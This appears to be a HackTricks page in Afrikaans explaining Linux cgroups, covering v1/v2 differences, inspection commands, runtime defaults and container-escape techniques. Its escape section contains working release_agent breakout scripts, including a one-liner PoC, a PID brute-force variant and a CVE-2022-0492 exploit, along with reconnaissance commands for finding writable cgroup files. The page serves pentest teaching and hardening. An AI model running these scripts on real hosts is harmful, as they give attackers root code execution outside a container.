# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux **control groups** is die kernmeganisme wat gebruik word om prosesse saam te groepeer vir rekeninghouding, beperking, prioritisering en beleidstoepassing. As namespaces hoofsaaklik gaan oor die isolering van die aansig van hulpbronne, gaan cgroups hoofsaaklik oor die beheer van **hoeveel** van daardie hulpbronne ’n groep prosesse mag verbruik en, in sommige gevalle, **watter klasse van hulpbronne** hulle oor die algemeen mee mag interaksioneer. Containers vertrou konstant op cgroups, selfs wanneer die gebruiker dit nooit direk bekyk nie, omdat byna elke moderne runtime ’n manier nodig het om aan die kernel te sê "hierdie prosesse behoort aan hierdie workload, en dit is die hulpbronreëls wat op hulle van toepassing is".

Dit is waarom container-engines ’n nuwe container in sy eie cgroup-subboom plaas. Sodra die prosesboom daar is, kan die runtime geheue beperk, die aantal PIDs beperk, CPU-gebruik weeg, I/O reguleer en toesteltoegang beperk. In ’n produksie-omgewing is dit noodsaaklik beide vir multi-tenant veiligheid en vir eenvoudige operasionele higiëne. ’n Container sonder sinvolle hulpbronbeheer kan geheue uitput, die stelsel met prosesse oorstroom of CPU en I/O monopolieer op maniere wat die gasheer of aangrensende workloads onstabiel maak.

Uit ’n sekuriteitsperspektief is cgroups op twee afsonderlike maniere belangrik. Eerstens maak swak of afwesige hulpbronlimiete eenvoudige denial-of-service-aanvalle moontlik. Tweedens het sommige cgroup-funksies, veral in ouer **cgroup v1** konfigurasies, histories kragtige breakout primitives geskep wanneer hulle van binne ’n container skryfbaar was.

## v1 Vs v2

Daar is twee groot cgroup-modelle in gebruik. **cgroup v1** maak verskeie controller-hiërargieë sigbaar, en ouer exploit-writeups draai dikwels om die vreemde en soms oor-magagtige semantiek wat daar beskikbaar is. **cgroup v2** bring ’n meer verenigde hiërargie en oor die algemeen skoner gedrag. Moderne distributions gee toenemend de voorkeur aan cgroup v2, maar gemengde of legacy-omgewings bestaan nog steeds, wat beteken dat albei modelle steeds relevant is wanneer werklike stelsels ondersoek word.

Die verskil is belangrik omdat sommige van die beroemdste container breakout-verhale, soos misbruik van **`release_agent`** in cgroup v1, baie spesifiek gekoppel is aan ouer cgroup-gedrag. ’n Leser wat ’n cgroup-exploit op ’n blog sien en dit dan blindelings op ’n moderne cgroup v2-only stelsel toepas, sal waarskynlik misverstaan wat eintlik op die teiken moontlik is.

## Inspeksie

Die vinnigste manier om te sien waar jou huidige shell sit, is:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` lêer toon die cgroup-paaie wat met die huidige proses geassosieer is. Op 'n moderne cgroup v2 host sal jy dikwels 'n verenigde inskrywing sien. Op ouer of hibriede hosts mag jy verskeie v1 controller-paaie sien. Sodra jy die pad ken, kan jy die ooreenstemmende lêers onder `/sys/fs/cgroup` inspekteer om limiete en huidige gebruik te sien.

Op 'n cgroup v2 host is die volgende kommando's nuttig:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Hierdie lêers openbaar watter controllers bestaan en watter aan child cgroups gedelegeer is. Hierdie delegeringsmodel maak saak in rootless- en systemd-managed-omgewings, waar die runtime moontlik slegs die deelverzameling van cgroup-funksionaliteit kan beheer wat die ouerhiërargie eintlik delegeer.

## Laboratorium

Een manier om cgroups in die praktyk waar te neem is om 'n geheue-beperkte container te laat loop:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Jy kan ook 'n PID-limited container probeer:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Gebruik

Docker, Podman, containerd en CRI-O vertrou almal op cgroups as deel van normale werking. Die verskille gaan gewoonlik nie oor of hulle cgroups gebruik nie, maar oor **watter standaardwaardes hulle kies**, **hoe hulle met systemd interaksie het**, **hoe rootless-delegering werk**, en **hoeveel van die konfigurasie op engine-vlak teenoor die orkestrasievlak beheer word**.

In Kubernetes word resource requests en limits uiteindelik cgroup-konfigurasie op die node. Die pad van Pod YAML na kernel-handhawing gaan deur die kubelet, die CRI runtime, en die OCI runtime, maar cgroups is steeds die kernel-meganisme wat uiteindelik die reël toepas. In Incus/LXC-omgewings word cgroups ook wyd gebruik, veral omdat system containers dikwels 'n ryker prosesboom en meer VM-agtige bedryfsverwachtinge openbaar.

## Misconfigurasies en Ontsnapping

Die klassieke cgroup-sekuriteitsverhaal is die skryfbare **cgroup v1 `release_agent`**-meganisme. In daardie model, as 'n aanvaller na die regte cgroup-lêers kon skryf, `notify_on_release` kon inskakel, en die pad wat in `release_agent` gestoor is kon beheer, kan die kernel uiteindelik 'n aanvaller-gekose pad in die initial namespaces op die host uitvoer wanneer die cgroup leeg geword het. Dit is waarom ouer beskrywings soveel aandag gee aan cgroup-controller-wrygbaarheid, mount options, en namespace/capability-voorwaardes.

Selfs wanneer `release_agent` nie beskikbaar is nie, maak cgroup-foute steeds saak. Te ruim device-toegang kan host-apparate vanuit die container bereikbaar maak. Ontbrekende memory- en PID-limiete kan 'n eenvoudige kode-uitvoering in 'n host DoS omskep. Swak cgroup-delegering in rootless-scenario's kan verdedigers ook mislei om te dink 'n beperking bestaan wanneer die runtime dit nooit regtig kon toepas nie.

### `release_agent` Agtergrond

Die `release_agent`-tegniek is slegs van toepassing op **cgroup v1**. Die basiese idee is dat wanneer die laaste proses in 'n cgroup uitstap en `notify_on_release=1` gestel is, die kernel die program uitvoer waarvan die pad in `release_agent` gestoor is. Daardie uitvoering gebeur in die **initial namespaces on the host**, wat 'n skryfbare `release_agent` in 'n container-ontsnappingsprimitief omskep.

Vir die tegniek om te werk, benodig die aanvaller gewoonlik:

- 'n skryfbare **cgroup v1** hiërargie
- die vermoë om 'n child cgroup te skep of te gebruik
- die vermoë om `notify_on_release` te stel
- die vermoë om 'n pad in `release_agent` te skryf
- 'n pad wat vanuit die host se oogpunt na 'n uitvoerbare lêer oplos

### Klassieke PoC

Die historiese eenreël PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
This PoC skryf 'n payload-pad in `release_agent`, aktiveer die cgroup release, en lees dan die uitvoer-lêer terug wat op die gasheer gegenereer is.

### Leesbare stap-vir-stap verduideliking

Dieselfde idee is makliker om te verstaan wanneer dit in stappe opgebreek word.

1. Skep en berei 'n skryfbare cgroup voor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiseer die gasheerpad wat ooreenstem met die container-lêerstelsel:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Plaas 'n payload wat vanaf die host path sigbaar sal wees:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Veroorsaak uitvoering deur die cgroup leeg te maak:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die effek is uitvoering aan die gasheer-kant van die payload met gasheer root-privileges. In 'n werklike exploit skryf die payload gewoonlik 'n proof file, spawn 'n reverse shell, of wysig die gasheer-state.

### Variant met relatiewe pad wat `/proc/<pid>/root` gebruik

In sommige omgewings is die gasheerpad na die container filesystem nie duidelik nie of word dit deur die storage driver weggesteek. In daardie geval kan die payload path via `/proc/<pid>/root/...` uitgedruk word, waar `<pid>` 'n host PID is wat behoort aan 'n proses in die huidige container. Dit is die basis van die relatiewe-pad brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Die relevante truuk hier is nie die brute-force self nie, maar die padvorm: `/proc/<pid>/root/...` laat die kernel toe om 'n lêer binne die container-lêerstelsel vanaf die gasheer-naamruimte op te los, selfs wanneer die direkte gasheer-stoorpad nie vooraf bekend is nie.

### CVE-2022-0492 Variasie

In 2022 het CVE-2022-0492 getoon dat skryf na `release_agent` in cgroup v1 nie korrek nagegaan het vir `CAP_SYS_ADMIN` in die **initiële** gebruiker-naamruimte nie. Dit het die tegniek baie meer bereikbaar gemaak op kwesbare kernels omdat 'n container-proses wat 'n cgroup-hiërargie kon mount `release_agent` kon skryf sonder om reeds voorregte in die gasheer-gebruiker-naamruimte te hê.

Minimale exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Op 'n kwesbare kernel voer die host `/proc/self/exe` uit met host root-regte.

Vir praktiese misbruik, begin deur te kontroleer of die omgewing nog skryfbare cgroup-v1-paaie of gevaarlike toesteltoegang toelaat:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
As `release_agent` teenwoordig en skryfbaar is, is jy reeds in legacy-breakout-gebied:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
As die cgroup-pad self nie 'n escape oplewer nie, is die volgende praktiese gebruik dikwels denial of service of reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
These commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively, or abuse a writable legacy cgroup interface.

## Checks

Hierdie opdragte vertel jou vinnig of die workload ruimte het om 'n fork-bomb uit te voer, geheue aggressief te verbruik, of 'n skryfbare legacy cgroup interface te misbruik.

Wanneer jy 'n teiken hersien, is die doel van die cgroup-ondersoeke om te bepaal watter cgroup-model in gebruik is, of die container skryfbare controller-paaie sien, en of ou breakout primitives soos `release_agent` selfs relevant is.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Wat hier interessant is:

- If `mount | grep cgroup` shows **cgroup v1**, ouere breakout writeups raak meer relevant.
- If `release_agent` exists and is reachable, dit is onmiddellik die moeite werd om dieper te ondersoek.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, die omgewing verdien baie nouer ondersoek.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, daardie kombinasie verdien noukeurige aandag. cgroups word dikwels as 'n vervelige hulpbronbestuur-onderwerp behandel, maar histories was hulle deel van sommige van die mees lesse-ryk container escape chains presies omdat die grens tussen "resource control" en "host influence" nie altyd so skoon was soos mense aangeneem het nie.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standaard geaktiveer | Containers word outomaties in cgroups geplaas; hulpbronlimiete is opsioneel tensy met flags gestel | weglating van `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Standaard geaktiveer | `--cgroups=enabled` is die standaard; cgroup namespace standaardwaardes wissel na gelang van cgroup-weergawe (`private` op cgroup v2, `host` op sommige cgroup v1 opstellings) | `--cgroups=disabled`, `--cgroupns=host`, verslapte device-toegang, `--privileged` |
| Kubernetes | Deur die runtime standaard geaktiveer | Pods en containers word deur die node runtime in cgroups geplaas; fynkorrelige hulpbronbeheer hang af van `resources.requests` / `resources.limits` | weglating van `resources.requests`/`resources.limits`, privileged device access, miskonfigurasie van host-vlak runtime |
| containerd / CRI-O | Standaard geaktiveer | cgroups is deel van normale lewensiklusbestuur | direkte runtime-konfigurasies wat device-beheer verslap of ouer skryfbare cgroup v1-koppelvlakke blootstel |

Die belangrike onderskeid is dat die aanwesigheid van cgroups gewoonlik standaard is, terwyl nuttige hulpbronbeperkings dikwels opsioneel is, tensy dit eksplisiet gekonfigureer word.
{{#include ../../../../banners/hacktricks-training.md}}
